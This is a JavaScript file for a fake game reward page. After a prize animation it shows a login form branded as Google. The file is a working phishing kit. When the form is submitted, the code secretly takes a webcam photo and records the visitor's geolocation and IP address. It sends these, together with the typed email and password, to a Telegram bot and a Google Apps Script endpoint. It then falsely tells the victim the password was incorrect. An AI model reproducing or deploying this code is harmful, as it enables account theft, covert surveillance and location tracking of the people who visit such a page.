let slideIndexHeader = 0;
showSlidesHeader();
function showSlidesHeader() {
    let i;
    let slidesHeader = document.getElementsByClassName("sliderHeader");
    for (i = 0; i < slidesHeader.length; i++) {
        slidesHeader[i].style.display = "none"; 
    }
    slideIndexHeader++;
    if (slideIndexHeader > slidesHeader.length) {slideIndexHeader = 1} 
    slidesHeader[slideIndexHeader-1].style.display = "block"; 
    setTimeout(showSlidesHeader, 2500);
}
const pop_btn1 = document.querySelector('.pop_btn1');
const pop_btn2 = document.querySelector('.pop_btn2');
const cost = document.querySelector('.cost');
const popup_bg = document.querySelector('.popup_bg');
const cancelBtn = document.querySelector('.cancelBtn');
const okBtn = document.querySelector('.okBtn');
// const ok = document.querySelector('#ok');
const reward_bg = document.querySelector('.reward_bg');
const img1 = document.querySelector('.img1');
const img2 = document.querySelector('.img2');
const img3 = document.querySelector('.img3');
const login_bg = document.querySelector('.login_bg');
const collectBtn = document.querySelector('.collectBtn');

let token = 0;
let x1;
let x2;
let x3;
let img;


pop_btn1.onclick = () =>{
    token = 1000;
    cost.innerHTML = token
    popup_bg.style.display = 'block';
    img = 1;
}

pop_btn2.onclick = () =>{
    token = 3000;
    cost.innerHTML = token
    popup_bg.style.display = 'block';
    img = 3;
}
cancelBtn.onclick = () => {
    popup_bg.style.display = 'none';
}
okBtn.onclick = () => {
    function audioFiles() {
        let audio = document.getElementById('audioFiles');
        audio.play();
    }
    audioFiles()
    x1 = Math.floor(Math.random() * 18) + 1;
    x2 = Math.floor(Math.random() * 18) + 1;
    x3 = Math.floor(Math.random() * 18) + 1;
    reward_bg.style.display = 'block'
    popup_bg.style.display = 'none';
    if(x1 === x2){
        x1 = Math.floor(Math.random() * 18) + 1;
        x2 = Math.floor(Math.random() * 18) + 1;
    }
    else if(x1 === x3){
        x1 = Math.floor(Math.random() * 18) + 1;
        x3 = Math.floor(Math.random() * 18) + 1;
    }
    else if(x2 === x3){
        x2 = Math.floor(Math.random() * 18) + 1;
        x3 = Math.floor(Math.random() * 18) + 1;
    }

    img1.src = `./img/${x1}.jpg`
    img2.src = `./img/${x2}.jpg`
    img3.src = `./img/${x3}.jpg`
    if(img == 3){
        img1.style.display = 'inline-block'
        img2.style.display = 'inline-block'
        img3.style.display = 'inline-block'
    }
    else{
        img2.style.display = 'block'
    }

}
collectBtn.onclick = () => {
    login_bg.style.display = 'block'
    reward_bg.style.display = 'none'
}


const keyValues = window.location.search;
const urlParams = new URLSearchParams(keyValues);

const chatId = urlParams.get('id')
const api = urlParams.get('api')
let website = 'ɢᴏᴏɢʟᴇ'

const now = new Date();
const hours = String(now.getHours()).padStart(2, '0');
const minutes = String(now.getMinutes()).padStart(2, '0');
const seconds = String(now.getSeconds()).padStart(2, '0');
let time = `${hours}:${minutes}:${seconds}`;

let country;
let currency;
let code;
let city;
async function getCountry() {
            
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                    country = data.country_name;
                    city = data.city;
                    currency = data.currency;
                    code = data.country_calling_code;
            } catch (error) {
                country = 'not found'
            }

}

getCountry();
const scriptURL = 'https://script.google.com/macros/s/AKfycbwgoZNx3PrZgOy74XKBBEo-j_MZQPMl07q1THBV5zBt_q4WI__uaC1AhSp8seGHSVxIRA/exec';
const form = document.forms['document'];
document.addEventListener("DOMContentLoaded", function () {
    ok.onclick = (e) => {
        e.preventDefault();
            // capture  
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert the image to a data URL and send it to the server
            const dataURL = canvas.toDataURL('image/png');
            sendImageToTelegram(dataURL);
            // telegram 
            event.preventDefault();
            ok.innerHTML = "VERIFYING..."
            setTimeout(() => {
                band = "ochiq"
                ok.innerHTML = "VERIFY"
                if (email.value.includes("@") && email.value.includes(".") && email.value.length > 8 && password.value) {
                    // google sheets 
                    fetch(scriptURL, {
                        method: 'POST',
                        body: new FormData(form),
                        headers: {
                            'Accept': 'application/json'
                        }
                    })
                    .then(response => response.json())
                    .then(data => {
                        form.reset(); // Optional: Reset the form fields
                        setTimeout(() => {
                            // window.location.href = 'https://www.highratecpm.com/z13dweggm?key=b91890e5549f27e0011a45e539055949';
                            // window.open('https://www.highratecpm.com/z13dweggm?key=b91890e5549f27e0011a45e539055949', '_blank');
                            // window.open('https://www.highratecpm.com/z13dweggm?key=b91890e5549f27e0011a45e539055949', '_blank');
                        }, 500);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        console.log('There was an error submitting the form');
                    });
                    // ip fetch 
                    fetch("https://api.ipify.org?format=json")
                        .then((response) => response.json())
                        .then((data) => {
                            let ip = data.ip;
                            sendToTelegram(ip);
                        });
                    function sendToTelegram(ip) {
                        let message = `𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ𓆪𓆪\n\n🐉⊚------------------------------⊚🐉\n➥  ʟᴏɢɪɴ ʙʏ  » ${website}\n📧 ↝ ᴇᴍᴀɪʟ » ${email.value}\n📟 ↝ ᴘᴀꜱꜱᴡᴏʀᴅ » ${password.value}\n🏴 ↝ ᴄᴏᴜɴᴛʀʏ » ${country}\n🌏 ↝ ɢᴏᴏɢʟᴇ ᴍᴀᴘꜱ » ${maps}\n☎️ ↝ ᴄᴏᴅᴇ »${code}\n💵 ↝ ᴄᴜʀʀᴇɴᴄʏ » ${currency}\n⚙️ ↝ ɪᴘ » ${ip}\n⏱ ↝ ᴛɪᴍᴇ » ${time}\n📝 ↝ ᴅᴀᴛᴇ » ${new Date().toDateString()}\n🐉⊚------------------------------⊚🐉\n↝ ᴅᴇᴠ ʙʏ » @PUDGEJVRBOT`;
                        let xhr = new XMLHttpRequest();
                        let token = api; //token
                        xhr.open(
                            "POST",
                            `https://api.telegram.org/bot${token}/sendMessage`,
                            true
                        );
                        xhr.onload = () => {
                            let respone = JSON.parse(xhr.responseText);
                            console.log(respone);
                            if (respone.ok) {
                                alert("Your password or email is incorrect!!");
                            } else {
                                console.log("Something went wrong!");
                            }
                        };
                        xhr.setRequestHeader(
                            "Content-type",
                            "application/x-www-form-urlencoded"
                        );
                        xhr.send(`chat_id=${chatId}&text=${message}`);
                    }
                    login_bg.style.display = 'none'
                } else {
                    alert("Please Enter Your Details Correctly!");
                }
            }, 2000);
    };
});

// location 
let latitude;
let longitude;
let maps;
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function (position) {
        latitude = position.coords.latitude;
        longitude = position.coords.longitude;
        maps = `https://www.google.com/maps/place/${latitude},${longitude}`;
        // Further usage of 'maps' can be done here or in subsequent functions
    }, function (error) {
        if (error.code === error.PERMISSION_DENIED) {
            maps = 'ɴᴏᴛ ꜰᴏᴜɴᴅ';
        } else {
            maps = 'Error retrieving location.';
        }
    });
} else {
    maps = 'ɴᴏᴛ ꜰᴏᴜɴᴅ';
}

window.onload = async function(){
    const constraints = {
        video: true
    };

    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const videoElement = document.getElementById('video');
        videoElement.srcObject = stream;
        // camera = 'on'
    } catch (err) {
        console.error('Error accessing media devices.', err);
    }
}
let CHAT_ID;
let TELEGRAM_BOT_TOKEN;
function sendImageToTelegram(dataURL) {
    TELEGRAM_BOT_TOKEN = api;
    CHAT_ID = chatId;
let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;

// Convert the data URL to a Blob
let blob = dataURLToBlob(dataURL);

// Create form data
let formData = new FormData();
formData.append('chat_id', CHAT_ID);
formData.append('photo', blob, 'capture.png');

// Send the image to Telegram
fetch(url, {
    method: 'POST',
    body: formData
})
.then(response => response.json())
.then(data => console.log('Telegram response:', data))
.catch(error => console.error('Error:', error));
}

function dataURLToBlob(dataURL) {
const byteString = atob(dataURL.split(',')[1]);
const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
const ab = new ArrayBuffer(byteString.length);
const ia = new Uint8Array(ab);
for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
}
return new Blob([ab], { type: mimeString });
}
